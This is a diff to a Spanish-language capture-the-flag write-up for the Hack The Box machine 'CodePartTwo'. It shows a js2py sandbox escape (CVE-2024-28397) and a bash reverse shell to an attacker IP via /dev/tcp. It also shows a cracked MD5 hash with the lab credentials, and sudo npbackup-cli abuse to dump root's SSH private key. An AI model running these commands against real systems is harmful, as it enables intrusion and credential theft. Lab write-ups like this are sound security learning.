@@ -48,21 +48,21 @@ gobuster dir -u http://codeparttwo.htb:8000/ -w /usr/share/seclists/Discovery/We
 
 #### Registro y Login
 
-Una vez registrado, se observa un dashboard donde podemos crear, guardar y lanzar nuestros scrips en JS:
+Una vez registrado, se observa un dashboard donde `podemos crear, guardar y lanzar` nuestros scripts en `JS`:
 
 ![Web dashboard](images/codeparttwo_web_dashboard.PNG)
 
 #### Descarga de la app
 
-Desde el path http://codeparttwo.htb/download se puede descargar una app.zip.
+Desde el path http://codeparttwo.htb/download se puede descargar el `fichero app.zip`.
 
 ![Unzip app.zip](images/codeparttwo_unzip_app.PNG)
 
-La app tiene una base de datos users.db vacía. El esquema de cada tabla es el siguiente:
+La app tiene una base de datos `users.db vacía`, aun así se puede ver el `esquema` de cada tabla.
 
 ![Users.db schema](images/codeparttwo_db_schema.PNG)
 
-Además podemos ver el fichero `app.py` que en realidad es el código de la aplicación web en `Flask` que corre en el Gunicorn.
+Además podemos ver el fichero `app.py` que en realidad es el código de la aplicación web en `Flask` que corre en el `Gunicorn`.
 
 #### Inyectando cookies
 
@@ -99,7 +99,7 @@ print(cookie_2)
 
 ![Cookie sign](images/codeparttwo_cookie_sign.PNG)
 
-Al inyectar la nueva cookie de admin obtenia un error, por lo que tocaba mirar otros vectores.
+Al inyectar la nueva cookie de admin obtengo un error, por lo que toca mirar otros vectores.
 
 ![Cookie error](images/codeparttwo_cookie_error.PNG)
 
@@ -108,7 +108,7 @@ Al inyectar la nueva cookie de admin obtenia un error, por lo que tocaba mirar o
 
 #### CVE-2024-28397 - Sandbox Escape en js2py
 
-En el app/requirements.txt se observa js2py 0.74. En esta versión, existe una vulnerabiliad en la implementación de una variable global dentro de js2py, permitiendo a un atacante obtener la referencia a un objeto Python en el entorno js2py, lo que permite escapar del entorno JS y ejecutar comandos arbitrarios en el host. Destacar que evade la restricción de js2py.disble_pyimport(), utilizada para impedir que el código JS escape del entorno.
+En el fichero `app/requirements.txt` se observa que funciona con `js2py 0.74`. En esta versión, existe una vulnerabiliad en la implementación de una variable global dentro de js2py, permitiendo a un atacante obtener la referencia a un objeto Python en el entorno js2py, lo que permite `escapar del entorno JS y ejecutar comandos arbitrarios` en el host. Destacar que `evade la restricción de js2py.disble_pyimport()`, utilizada para impedir que el código JS escape del entorno.
 
 PoC:
 
@@ -145,7 +145,7 @@ function f() {
 
 #### Reverse shell
 
-Modifico un poco el payload para que ejecute una reverse shell y obtengo acceso como app.
+Modifico un poco el `payload` para que ejecute una `reverse shell` y obtengo acceso como `app`.
 
 ```javascript
 let cmd = "bash -c 'bash -i >& /dev/tcp/10.10.16.22/1337 0>&1'"
@@ -169,13 +169,13 @@ stty rows 40 columns 184
 
 ### Post-Explotación
 
-Al cononcer la estructura de directorios de la app, me paso la `users.db` para ver lo que tiene (no `existía ningún usuario admin` xd) y obtengo el usuario `marco` con el hash `649c9d65a206a75f5abe509fe128bce5`.
+Al cononcer la estructura de directorios de la app, me paso la `users.db` para ver lo que tiene (`no existía ningún usuario admin` xd) y obtengo el usuario `marco` con el hash `649c9d65a206a75f5abe509fe128bce5`.
 
 ![Gunicorn database](images/codeparttwo_users_db_gunicorn.PNG)
 
 #### Tipo de Hash
 
-La herramienta `hash-identifier` dice tiene to la pinta de `MD5`.
+La herramienta `hash-identifier` dice que tiene to la pinta de `MD5`.
 
 ```bash
 hash-identifier 649c9d65a206a75f5abe509fe128bce5
@@ -185,7 +185,7 @@ hash-identifier 649c9d65a206a75f5abe509fe128bce5
 
 #### Hashcat
 
-Lanzo `hashcat` en modo MD5 para crackearlo por diccionario.
+Lanzo `hashcat` en modo `MD5` para crackearlo por `diccionario`.
 
 ```bash
 echo '649c9d65a206a75f5abe509fe128bce5' > marco_hash.txt
@@ -199,7 +199,7 @@ Obteniendo las credenciales para `marco:sweetangelbabylove`.
 
 #### SSH
 
-Nos conectamos por SSH con el usuario marco.
+Nos conectamos por `SSH` con el usuario `marco`.
 
 ```bash
 ssh marco@10.10.11.82
@@ -210,20 +210,31 @@ ssh marco@10.10.11.82
 
 #### Escalada a root
 
-El usuario marco puede ejecutar un comando de `backup` como root `(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli`, en la ayuda de la herramienta se puede ver su funcionamiento.
+El usuario marco puede ejecutar un comando de `backup` como root `(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli`. Además, en la ayuda de la herramienta se puede ver su funcionamiento.
 
 ![npbackup-cli --help](images/codeparttwo_npbackup_help.PNG)
 
-Básicamente `carga un fichero de configuración` (marco tiene uno con permisos de lectura y escritura en su /home) y ejecuta lo que le pases por `parámetros`.
+Básicamente `carga un fichero de configuración` (marco tiene uno con permisos de lectura y escritura en su /home) y esta ejecuta lo que le pases por `parámetros`.
 
 ![npbackup.conf](images/codeparttwo_npbackup_conf_file.PNG)
 
-Modificando este fichero de configuración puedo `apuntar a /root` en el PATH. Por otro lado, se puede ver que la única backup hecha es del PATH = `/home/app/app`, asi que fuerzo el nuevo backup con los parámetros `-b -f`.
+Modificando este fichero de configuración puedo `apuntar a /root` en el PATH.
+Por otro lado, se puede ver que la única backup hecha es del PATH = `/home/app/app`, asi que fuerzo el `backup con la nueva configuración`.
+
+```bash
+sudo /usr/local/bin/np-backup-cli -c /tmp/mybackup.conf -b -f
+```
 
 ![Backup existente](images/codeparttwo_backup_existente.PNG)
 ![Backup de /root/](images/codeparttwo_root_backup.PNG)
 
-Ahora vuelvo a listar los snapshots realizados, selecciono la que he hecho y me `dumpeo la id_rsa de root` (chmod 600) para conectarme por `SSH`.
+Ahora vuelvo a listar los snapshots realizados, selecciono el que he hecho y me `dumpeo la id_rsa de root` (chmod 600) para conectarme por `SSH`.
+
+```bash
+sudo /usr/local/bin/npbackup-cli -c /tmp/mybackup.conf -s
+sudo /usr/local/bin/npbackup-cli -c /tmp/mybackup.conf --snapshot-id 11586cfb --dump /root/.ssh/id_rsa
+ssh -i /tmp/my_rsa root@10.10.11.82
+```
 
 ![Dumpeo de /root/.ssh/id_rsa](images/codeparttwo_dumpeo_id_rsa.PNG)
 ![SSH to root](images/codeparttwo_ssh_to_root.PNG)
